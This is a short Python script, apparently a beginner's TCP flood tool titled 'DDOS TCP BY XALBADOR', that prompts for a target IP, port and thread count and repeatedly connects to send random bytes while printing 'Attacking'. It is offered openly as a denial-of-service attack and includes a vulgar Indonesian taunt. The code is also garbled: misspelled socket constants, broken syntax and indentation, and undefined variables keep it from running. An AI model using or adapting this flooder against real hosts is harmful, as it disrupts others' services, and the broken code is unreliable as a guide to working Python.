#DDOS TCP BY XALBADOR
#PEMULA
import socket
import random
import threading
import os
import sys


os.system("clear")
print("Attacking By XALBADOR")
print("Awas kau curi kontol")

ip = str(input('[+] Ip Target: '))
port = int(input('[+] Port Target: '))
packet = int(input('[+] Packet: '))
threading = int(input('[+] Thread: '))


def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
        s = socket.socket(socket.AF_INET. socket.SDCK_STREA)
        s.connect((ip.port))
        s.send(hh)
        for i range(pack):
            s.send(hh)
        xx += 1
        print('Attacking '+ip+'| send: '+str(xx))
        except:
            s.close()
            print('Done')
            
for x  in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
    

    
